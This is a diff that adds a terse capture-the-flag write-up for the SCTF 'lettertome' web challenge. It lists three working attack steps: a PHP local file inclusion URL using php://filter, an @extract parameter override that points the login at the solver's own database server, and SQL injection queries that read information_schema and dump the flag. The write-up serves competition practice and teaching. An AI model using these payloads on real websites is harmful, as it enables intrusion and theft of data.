@@ -1,0 +1,17 @@
+1. PHP local file inclusion
+http://lettertome.eatpwnnosleep.com/?page=php://filter/convert.base64-encode/resource=??
+
+
+2. Login by connecting to remote database
+Use @extract to override connection setting
+http://lettertome.eatpwnnosleep.com/?page=login&servername={YOUR_SERVER_SETTING}&username=pwn&password=pwn&id=admin&pw=admin
+
+
+3. SQL Injection on note using filtering
+use injection.py
+
+select column_name,table_name from information_schema.columns LIMIT 606,1
+-> ('LTOM_Fl3g', 'flag')
+
+select flag,1 from LTOM_Fl3g LIMIT 0,1
+-> ('1', 'SCTF{Enj0y_y0ur_0nly_life}')
